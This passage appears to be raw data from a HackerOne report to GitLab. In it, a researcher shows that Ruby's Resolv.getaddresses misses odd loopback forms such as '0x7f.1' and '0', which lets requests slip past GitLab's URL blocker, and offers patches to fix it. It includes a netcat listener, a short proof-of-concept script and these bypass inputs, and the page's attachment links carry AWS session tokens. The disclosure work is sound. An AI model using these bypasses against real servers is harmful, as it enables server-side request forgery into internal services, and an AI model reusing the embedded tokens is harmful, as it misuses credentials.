\u0026quot;127.000.001\u0026quot;\nirb(main):007:0\u0026gt; server_ips = Resolv.getaddresses(uri)\n=\u0026gt; []\nirb(main):008:0\u0026gt; blocked_ips = [\u0026quot;127.0.0.1\u0026quot;, \u0026quot;::1\u0026quot;, \u0026quot;0.0.0.0\u0026quot;]\n=\u0026gt; [\u0026quot;127.0.0.1\u0026quot;, \u0026quot;::1\u0026quot;, \u0026quot;0.0.0.0\u0026quot;]\nirb(main):009:0\u0026gt; (blocked_ips \u0026amp; server_ips).any?\n=\u0026gt; false\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eHere is a proof of concept that demonstrates the dangers of relying on Ruby\u0026#39;s native resolver for security-related features.\u003c/p\u003e\n\n\u003cp\u003e1) Fire up a listener in one tab:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ echo -e \u0026quot;HTTP/1.1 200 OK\\n\\nHello from netcat :)\u0026quot; | sudo nc -l 80\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e2) Run \u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"poc.rb\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/236/086/a9b56b40d81daa44affb3310a5e0f766ed26ae13/poc.rb?response-content-disposition=attachment%3B%20filename%3D%22poc.rb%22%3B%20filename%2A%3DUTF-8%27%27poc.rb\u0026amp;response-content-type=text%2Fplain\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ4IZIDGEJ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T045811Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHgvhPRXI%2B7x6zNGnfFbWtzZacTUlKPt3VwSApQji3YyAiEA2Y%2FuJ72LgjXuchHTkycORzGcHp9y6ZUl%2BeyKz%2FFfjlAqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDHblJHa0bCSVtoiX8yqRA7Ct%2F1l8ihdf2xXnJNUaJGv7nq%2F1b1xXdqHLpOjb5bN22Ac%2BQjHl%2Bna1KjqQx0Qu8Fcs0WQUm6dGPZbHLiP%2FRkIHh6FlY41MtajX39mvBrMgWCmioQD4vc7NSsiqHLG4GmvgnIM0wWXfwwv%2Fmq%2BjRWJQacOyz7e9kYXzI%2BQkViUKmcuV48xoXGswHYXnPSqKC6IqSk0Rgc6j2xAmne60g5PNHQf%2BehWLSoXupow19n2vF%2BE4dhw1ZLX%2B9fBct02t5%2B41MEA5z30yhC52UxDX9%2BedHi3rXpTTyV%2FX%2BWfdeGSGSqmwrTAcipCpz01NR%2Fkk3srD5BLQB%2B6BdeDlwwcltfcgYdKO39yRPNyZePA9ihdN%2B4YHA7%2FY9ufCPbEevGDvtv3mVStbES31aUOxSmGNj%2B8fMMJqFBAtD4Qx54l8UFyMf%2BQ8PPbA0OLpU9rjip1L0zxevK6IGISP%2FPlDldWsNQvfi1Xn6QvRkmL1ANNGXqycx5MDUJExPyV801VOQ68%2FfbB87Cmdd8xIJWUNtmpsIgDtMO2wqv8FOusBRxy8OOzTGCKFydY5xn2aZtaPj3obazs55j%2BS5FoY%2BdkqAuB4pbyPDlTBBI%2Fe4ZIYYBH9t51VaQaRwrhKPTTntuBcC2b5uuKcGXYq9rnIAgbUHulNqSoxgZep0wAjzrLEFeECcDfqDCjG1QyXJkGQyq3UjLElJNKzeGgK4y5hW9emXis3wfoUPLixiL7W8M52b0Q9HQrT0RxnkkNSLj7aPyOAVCPImHNwjJ%2FI2KIbB5iD4e9PbxcHFvjKgkNUQh2pESECovpzx%2BAz7wsT%2FUMRieGT%2BFtMt1o90%2BewPxe95i025ZqzwWI1aVcXtA%3D%3D\u0026amp;X-Amz-Signature=c2dd8757182550b99758fd8b9301b26b6a50ae29dc44c85b08c096b2faa1c24e\" data-attachment-type=\"text/plain\"\u003epoc.rb (F236086)\u003c/a\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ cat poc.rb\nrequire \u0026#39;resolv\u0026#39;\nrequire \u0026#39;uri\u0026#39;\nrequire \u0026#39;net/http\u0026#39;\n\nputs \u0026quot;IP to test:\u0026quot;\nhost = gets.strip\n\naddrs = Resolv.getaddresses(host)\nputs \u0026quot;Result of Resolv.getaddresses():\u0026quot;\nputs addrs\nputs \u0026quot;(#{addrs.length} address(es))\u0026quot;\n\nuri = URI.parse(\u0026quot;http://#{host}/\u0026quot;)\nresponse = Net::HTTP.get_response uri\nputs \u0026quot;Result of fetching http://#{host}/:\u0026quot;\nputs response.body\n$ ruby poc.rb\nIP to test:\n127.000.001\nResult of Resolv.getaddresses():\n(0 address(es))\nResult of fetching http://127.000.001/:\nHello from netcat :)\n$ ruby poc.rb\nIP to test:\n0x7f.1\nResult of Resolv.getaddresses():\n(0 address(es))\nResult of fetching http://0x7f.1/:\nHello from netcat :)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2017-11-03T13:12:59.103Z","updated_at":"2017-11-03T13:12:59.103Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":236086,"filename":"poc.rb","type":"text/plain","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/236/086/a9b56b40d81daa44affb3310a5e0f766ed26ae13/poc.rb?response-content-disposition=attachment%3B%20filename%3D%22poc.rb%22%3B%20filename%2A%3DUTF-8%27%27poc.rb\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4IZIDGEJ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T045811Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHgvhPRXI%2B7x6zNGnfFbWtzZacTUlKPt3VwSApQji3YyAiEA2Y%2FuJ72LgjXuchHTkycORzGcHp9y6ZUl%2BeyKz%2FFfjlAqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDHblJHa0bCSVtoiX8yqRA7Ct%2F1l8ihdf2xXnJNUaJGv7nq%2F1b1xXdqHLpOjb5bN22Ac%2BQjHl%2Bna1KjqQx0Qu8Fcs0WQUm6dGPZbHLiP%2FRkIHh6FlY41MtajX39mvBrMgWCmioQD4vc7NSsiqHLG4GmvgnIM0wWXfwwv%2Fmq%2BjRWJQacOyz7e9kYXzI%2BQkViUKmcuV48xoXGswHYXnPSqKC6IqSk0Rgc6j2xAmne60g5PNHQf%2BehWLSoXupow19n2vF%2BE4dhw1ZLX%2B9fBct02t5%2B41MEA5z30yhC52UxDX9%2BedHi3rXpTTyV%2FX%2BWfdeGSGSqmwrTAcipCpz01NR%2Fkk3srD5BLQB%2B6BdeDlwwcltfcgYdKO39yRPNyZePA9ihdN%2B4YHA7%2FY9ufCPbEevGDvtv3mVStbES31aUOxSmGNj%2B8fMMJqFBAtD4Qx54l8UFyMf%2BQ8PPbA0OLpU9rjip1L0zxevK6IGISP%2FPlDldWsNQvfi1Xn6QvRkmL1ANNGXqycx5MDUJExPyV801VOQ68%2FfbB87Cmdd8xIJWUNtmpsIgDtMO2wqv8FOusBRxy8OOzTGCKFydY5xn2aZtaPj3obazs55j%2BS5FoY%2BdkqAuB4pbyPDlTBBI%2Fe4ZIYYBH9t51VaQaRwrhKPTTntuBcC2b5uuKcGXYq9rnIAgbUHulNqSoxgZep0wAjzrLEFeECcDfqDCjG1QyXJkGQyq3UjLElJNKzeGgK4y5hW9emXis3wfoUPLixiL7W8M52b0Q9HQrT0RxnkkNSLj7aPyOAVCPImHNwjJ%2FI2KIbB5iD4e9PbxcHFvjKgkNUQh2pESECovpzx%2BAz7wsT%2FUMRieGT%2BFtMt1o90%2BewPxe95i025ZqzwWI1aVcXtA%3D%3D\u0026X-Amz-Signature=c2dd8757182550b99758fd8b9301b26b6a50ae29dc44c85b08c096b2faa1c24e"}],"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2131429,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"\u003e It was probably difficult to replicate this issue, because it depends on the machine/OS you are running `Resolv` on.\n\nThe output from your very first response:\n\n```\nirb(main):010:0\u003e uri.hostname\n=\u003e \"0x7f.1\"\nirb(main):011:0\u003e ips = Resolv.getaddresses(uri.hostname)\n=\u003e [\"127.0.0.1\"]\n```\n\nThe output on my machine (**💻 Machine 1**):\n\n```\nirb(main):001:0\u003e require 'resolv'\n=\u003e true\nirb(main):002:0\u003e uri = \"0x7f.1\"\n=\u003e \"0x7f.1\"\nirb(main):003:0\u003e ips = Resolv.getaddresses(uri)\n=\u003e []\n```","markdown_message":"\u003cblockquote\u003e\n\u003cp\u003eIt was probably difficult to replicate this issue, because it depends on the machine/OS you are running \u003ccode\u003eResolv\u003c/code\u003e on.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eThe output from your very first response:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eirb(main):010:0\u0026gt; uri.hostname\n=\u0026gt; \u0026quot;0x7f.1\u0026quot;\nirb(main):011:0\u0026gt; ips = Resolv.getaddresses(uri.hostname)\n=\u0026gt; [\u0026quot;127.0.0.1\u0026quot;]\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe output on my machine (\u003cstrong\u003e💻 Machine 1\u003c/strong\u003e):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eirb(main):001:0\u0026gt; require \u0026#39;resolv\u0026#39;\n=\u0026gt; true\nirb(main):002:0\u0026gt; uri = \u0026quot;0x7f.1\u0026quot;\n=\u0026gt; \u0026quot;0x7f.1\u0026quot;\nirb(main):003:0\u0026gt; ips = Resolv.getaddresses(uri)\n=\u0026gt; []\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2017-11-03T13:17:49.537Z","updated_at":"2017-11-03T13:17:49.537Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2131876,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here is a full patch that should prevent this issue altogether: {F236113}. Please verify that you are not relying on `Resolv.getaddresses()` anywhere else in your codebase. That function is completely broken and should never be used for security-related features.\n\nHere is the snippet of code responsible for forwarding the address on to the OS in `lib/resolv.rb`:\n\n```ruby\nbegin\n  raise LoadError unless /mswin|mingw|cygwin/ =~ RUBY_PLATFORM\n  require 'win32/resolv'\n  DefaultFileName = Win32::Resolv.get_hosts_path\nrescue LoadError\n  DefaultFileName = '/etc/hosts'\nend\n```\n\nLink to source code: https://github.com/ruby/ruby/blob/trunk/lib/resolv.rb#L169-L175\n\nI have not had a chance to discuss this with the Ruby Core development team yet.","markdown_message":"\u003cp\u003eHere is a full patch that should prevent this issue altogether: \u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"url_blocker.rb.patch\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/236/113/a972f7804f3f58a2520f1d696f6f27f94b6129ec/url_blocker.rb.patch?response-content-disposition=attachment%3B%20filename%3D%22url_blocker.rb.patch%22%3B%20filename%2A%3DUTF-8%27%27url_blocker.rb.patch\u0026amp;response-content-type=text%2Fx-ruby\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ4IZIDGEJ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T045811Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHgvhPRXI%2B7x6zNGnfFbWtzZacTUlKPt3VwSApQji3YyAiEA2Y%2FuJ72LgjXuchHTkycORzGcHp9y6ZUl%2BeyKz%2FFfjlAqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDHblJHa0bCSVtoiX8yqRA7Ct%2F1l8ihdf2xXnJNUaJGv7nq%2F1b1xXdqHLpOjb5bN22Ac%2BQjHl%2Bna1KjqQx0Qu8Fcs0WQUm6dGPZbHLiP%2FRkIHh6FlY41MtajX39mvBrMgWCmioQD4vc7NSsiqHLG4GmvgnIM0wWXfwwv%2Fmq%2BjRWJQacOyz7e9kYXzI%2BQkViUKmcuV48xoXGswHYXnPSqKC6IqSk0Rgc6j2xAmne60g5PNHQf%2BehWLSoXupow19n2vF%2BE4dhw1ZLX%2B9fBct02t5%2B41MEA5z30yhC52UxDX9%2BedHi3rXpTTyV%2FX%2BWfdeGSGSqmwrTAcipCpz01NR%2Fkk3srD5BLQB%2B6BdeDlwwcltfcgYdKO39yRPNyZePA9ihdN%2B4YHA7%2FY9ufCPbEevGDvtv3mVStbES31aUOxSmGNj%2B8fMMJqFBAtD4Qx54l8UFyMf%2BQ8PPbA0OLpU9rjip1L0zxevK6IGISP%2FPlDldWsNQvfi1Xn6QvRkmL1ANNGXqycx5MDUJExPyV801VOQ68%2FfbB87Cmdd8xIJWUNtmpsIgDtMO2wqv8FOusBRxy8OOzTGCKFydY5xn2aZtaPj3obazs55j%2BS5FoY%2BdkqAuB4pbyPDlTBBI%2Fe4ZIYYBH9t51VaQaRwrhKPTTntuBcC2b5uuKcGXYq9rnIAgbUHulNqSoxgZep0wAjzrLEFeECcDfqDCjG1QyXJkGQyq3UjLElJNKzeGgK4y5hW9emXis3wfoUPLixiL7W8M52b0Q9HQrT0RxnkkNSLj7aPyOAVCPImHNwjJ%2FI2KIbB5iD4e9PbxcHFvjKgkNUQh2pESECovpzx%2BAz7wsT%2FUMRieGT%2BFtMt1o90%2BewPxe95i025ZqzwWI1aVcXtA%3D%3D\u0026amp;X-Amz-Signature=f34179969e439f8822ce708ab912b6a05b48998443f9584cbbe9ffa5b4f4109d\" data-attachment-type=\"text/x-ruby\"\u003eurl_blocker.rb.patch (F236113)\u003c/a\u003e. Please verify that you are not relying on \u003ccode\u003eResolv.getaddresses()\u003c/code\u003e anywhere else in your codebase. That function is completely broken and should never be used for security-related features.\u003c/p\u003e\n\n\u003cp\u003eHere is the snippet of code responsible for forwarding the address on to the OS in \u003ccode\u003elib/resolv.rb\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003ebegin\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eraise\u003c/span\u003e \u003cspan class=\"no\"\u003eLoadError\u003c/span\u003e \u003cspan class=\"k\"\u003eunless\u003c/span\u003e \u003cspan class=\"sr\"\u003e/mswin|mingw|cygwin/\u003c/span\u003e \u003cspan class=\"o\"\u003e=~\u003c/span\u003e \u003cspan class=\"no\"\u003eRUBY_PLATFORM\u003c/span\u003e\n  \u003cspan class=\"nb\"\u003erequire\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;win32/resolv\u0026#39;\u003c/span\u003e\n  \u003cspan class=\"no\"\u003eDefaultFileName\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"no\"\u003eWin32\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"no\"\u003eResolv\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eget_hosts_path\u003c/span\u003e\n\u003cspan class=\"k\"\u003erescue\u003c/span\u003e \u003cspan class=\"no\"\u003eLoadError\u003c/span\u003e\n  \u003cspan class=\"no\"\u003eDefaultFileName\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;/etc/hosts\u0026#39;\u003c/span\u003e\n\u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eLink to source code: \u003ca title=\"https://github.com/ruby/ruby/blob/trunk/lib/resolv.rb#L169-L175\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fruby%2Fruby%2Fblob%2Ftrunk%2Flib%2Fresolv.rb%23L169-L175\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/ruby/ruby/blob/trunk/lib/resolv.rb#L169-L175\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eI have not had a chance to discuss this with the Ruby Core development team yet.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-03T14:40:07.525Z","updated_at":"2017-11-03T14:40:07.525Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":236113,"filename":"url_blocker.rb.patch","type":"text/x-ruby","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/236/113/a972f7804f3f58a2520f1d696f6f27f94b6129ec/url_blocker.rb.patch?response-content-disposition=attachment%3B%20filename%3D%22url_blocker.rb.patch%22%3B%20filename%2A%3DUTF-8%27%27url_blocker.rb.patch\u0026response-content-type=text%2Fx-ruby\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4IZIDGEJ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T045811Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHgvhPRXI%2B7x6zNGnfFbWtzZacTUlKPt3VwSApQji3YyAiEA2Y%2FuJ72LgjXuchHTkycORzGcHp9y6ZUl%2BeyKz%2FFfjlAqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDHblJHa0bCSVtoiX8yqRA7Ct%2F1l8ihdf2xXnJNUaJGv7nq%2F1b1xXdqHLpOjb5bN22Ac%2BQjHl%2Bna1KjqQx0Qu8Fcs0WQUm6dGPZbHLiP%2FRkIHh6FlY41MtajX39mvBrMgWCmioQD4vc7NSsiqHLG4GmvgnIM0wWXfwwv%2Fmq%2BjRWJQacOyz7e9kYXzI%2BQkViUKmcuV48xoXGswHYXnPSqKC6IqSk0Rgc6j2xAmne60g5PNHQf%2BehWLSoXupow19n2vF%2BE4dhw1ZLX%2B9fBct02t5%2B41MEA5z30yhC52UxDX9%2BedHi3rXpTTyV%2FX%2BWfdeGSGSqmwrTAcipCpz01NR%2Fkk3srD5BLQB%2B6BdeDlwwcltfcgYdKO39yRPNyZePA9ihdN%2B4YHA7%2FY9ufCPbEevGDvtv3mVStbES31aUOxSmGNj%2B8fMMJqFBAtD4Qx54l8UFyMf%2BQ8PPbA0OLpU9rjip1L0zxevK6IGISP%2FPlDldWsNQvfi1Xn6QvRkmL1ANNGXqycx5MDUJExPyV801VOQ68%2FfbB87Cmdd8xIJWUNtmpsIgDtMO2wqv8FOusBRxy8OOzTGCKFydY5xn2aZtaPj3obazs55j%2BS5FoY%2BdkqAuB4pbyPDlTBBI%2Fe4ZIYYBH9t51VaQaRwrhKPTTntuBcC2b5uuKcGXYq9rnIAgbUHulNqSoxgZep0wAjzrLEFeECcDfqDCjG1QyXJkGQyq3UjLElJNKzeGgK4y5hW9emXis3wfoUPLixiL7W8M52b0Q9HQrT0RxnkkNSLj7aPyOAVCPImHNwjJ%2FI2KIbB5iD4e9PbxcHFvjKgkNUQh2pESECovpzx%2BAz7wsT%2FUMRieGT%2BFtMt1o90%2BewPxe95i025ZqzwWI1aVcXtA%3D%3D\u0026X-Amz-Signature=f34179969e439f8822ce708ab912b6a05b48998443f9584cbbe9ffa5b4f4109d"}],"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2131996,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Actually, there is no need to expand the blacklist. Here is the updated patch: {F236128}.","markdown_message":"\u003cp\u003eActually, there is no need to expand the blacklist. Here is the updated patch: \u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"url_blocker.rb.patch\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/236/128/1f98d265187089a4682805bd261b282d3c023b45/url_blocker.rb.patch?response-content-disposition=attachment%3B%20filename%3D%22url_blocker.rb.patch%22%3B%20filename%2A%3DUTF-8%27%27url_blocker.rb.patch\u0026amp;response-content-type=text%2Fx-ruby\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ4IZIDGEJ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T045811Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHgvhPRXI%2B7x6zNGnfFbWtzZacTUlKPt3VwSApQji3YyAiEA2Y%2FuJ72LgjXuchHTkycORzGcHp9y6ZUl%2BeyKz%2FFfjlAqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDHblJHa0bCSVtoiX8yqRA7Ct%2F1l8ihdf2xXnJNUaJGv7nq%2F1b1xXdqHLpOjb5bN22Ac%2BQjHl%2Bna1KjqQx0Qu8Fcs0WQUm6dGPZbHLiP%2FRkIHh6FlY41MtajX39mvBrMgWCmioQD4vc7NSsiqHLG4GmvgnIM0wWXfwwv%2Fmq%2BjRWJQacOyz7e9kYXzI%2BQkViUKmcuV48xoXGswHYXnPSqKC6IqSk0Rgc6j2xAmne60g5PNHQf%2BehWLSoXupow19n2vF%2BE4dhw1ZLX%2B9fBct02t5%2B41MEA5z30yhC52UxDX9%2BedHi3rXpTTyV%2FX%2BWfdeGSGSqmwrTAcipCpz01NR%2Fkk3srD5BLQB%2B6BdeDlwwcltfcgYdKO39yRPNyZePA9ihdN%2B4YHA7%2FY9ufCPbEevGDvtv3mVStbES31aUOxSmGNj%2B8fMMJqFBAtD4Qx54l8UFyMf%2BQ8PPbA0OLpU9rjip1L0zxevK6IGISP%2FPlDldWsNQvfi1Xn6QvRkmL1ANNGXqycx5MDUJExPyV801VOQ68%2FfbB87Cmdd8xIJWUNtmpsIgDtMO2wqv8FOusBRxy8OOzTGCKFydY5xn2aZtaPj3obazs55j%2BS5FoY%2BdkqAuB4pbyPDlTBBI%2Fe4ZIYYBH9t51VaQaRwrhKPTTntuBcC2b5uuKcGXYq9rnIAgbUHulNqSoxgZep0wAjzrLEFeECcDfqDCjG1QyXJkGQyq3UjLElJNKzeGgK4y5hW9emXis3wfoUPLixiL7W8M52b0Q9HQrT0RxnkkNSLj7aPyOAVCPImHNwjJ%2FI2KIbB5iD4e9PbxcHFvjKgkNUQh2pESECovpzx%2BAz7wsT%2FUMRieGT%2BFtMt1o90%2BewPxe95i025ZqzwWI1aVcXtA%3D%3D\u0026amp;X-Amz-Signature=8420a320837e6376487ec8c568d97cd4616a558618bf4760895c2fd5b1d1360d\" data-attachment-type=\"text/x-ruby\"\u003eurl_blocker.rb.patch (F236128)\u003c/a\u003e.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-03T15:09:09.034Z","updated_at":"2017-11-03T15:09:09.034Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":236128,"filename":"url_blocker.rb.patch","type":"text/x-ruby","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/236/128/1f98d265187089a4682805bd261b282d3c023b45/url_blocker.rb.patch?response-content-disposition=attachment%3B%20filename%3D%22url_blocker.rb.patch%22%3B%20filename%2A%3DUTF-8%27%27url_blocker.rb.patch\u0026response-content-type=text%2Fx-ruby\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4IZIDGEJ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T045811Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHgvhPRXI%2B7x6zNGnfFbWtzZacTUlKPt3VwSApQji3YyAiEA2Y%2FuJ72LgjXuchHTkycORzGcHp9y6ZUl%2BeyKz%2FFfjlAqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDHblJHa0bCSVtoiX8yqRA7Ct%2F1l8ihdf2xXnJNUaJGv7nq%2F1b1xXdqHLpOjb5bN22Ac%2BQjHl%2Bna1KjqQx0Qu8Fcs0WQUm6dGPZbHLiP%2FRkIHh6FlY41MtajX39mvBrMgWCmioQD4vc7NSsiqHLG4GmvgnIM0wWXfwwv%2Fmq%2BjRWJQacOyz7e9kYXzI%2BQkViUKmcuV48xoXGswHYXnPSqKC6IqSk0Rgc6j2xAmne60g5PNHQf%2BehWLSoXupow19n2vF%2BE4dhw1ZLX%2B9fBct02t5%2B41MEA5z30yhC52UxDX9%2BedHi3rXpTTyV%2FX%2BWfdeGSGSqmwrTAcipCpz01NR%2Fkk3srD5BLQB%2B6BdeDlwwcltfcgYdKO39yRPNyZePA9ihdN%2B4YHA7%2FY9ufCPbEevGDvtv3mVStbES31aUOxSmGNj%2B8fMMJqFBAtD4Qx54l8UFyMf%2BQ8PPbA0OLpU9rjip1L0zxevK6IGISP%2FPlDldWsNQvfi1Xn6QvRkmL1ANNGXqycx5MDUJExPyV801VOQ68%2FfbB87Cmdd8xIJWUNtmpsIgDtMO2wqv8FOusBRxy8OOzTGCKFydY5xn2aZtaPj3obazs55j%2BS5FoY%2BdkqAuB4pbyPDlTBBI%2Fe4ZIYYBH9t51VaQaRwrhKPTTntuBcC2b5uuKcGXYq9rnIAgbUHulNqSoxgZep0wAjzrLEFeECcDfqDCjG1QyXJkGQyq3UjLElJNKzeGgK4y5hW9emXis3wfoUPLixiL7W8M52b0Q9HQrT0RxnkkNSLj7aPyOAVCPImHNwjJ%2FI2KIbB5iD4e9PbxcHFvjKgkNUQh2pESECovpzx%2BAz7wsT%2FUMRieGT%2BFtMt1o90%2BewPxe95i025ZqzwWI1aVcXtA%3D%3D\u0026X-Amz-Signature=8420a320837e6376487ec8c568d97cd4616a558618bf4760895c2fd5b1d1360d"}],"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2134189,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I might start fuzzing `Resolv::getaddresses` just to see if I can find some more bypasses. In the mean time, here is another bypass:\n\n```\nirb(main):001:0\u003e require 'resolv'\n=\u003e true\nirb(main):002:0\u003e Resolv.getaddresses(\"0\")\n=\u003e []\n```\n\n{F236492}\n","markdown_message":"\u003cp\u003eI might start fuzzing \u003ccode\u003eResolv::getaddresses\u003c/code\u003e just to see if I can find some more bypasses. In the mean time, here is another bypass:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eirb(main):001:0\u0026gt; require \u0026#39;resolv\u0026#39;\n=\u0026gt; true\nirb(main):002:0\u0026gt; Resolv.getaddresses(\u0026quot;0\u0026quot;)\n=\u0026gt; []\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screenshot_from_2017-11-04_13-43-16.png\" 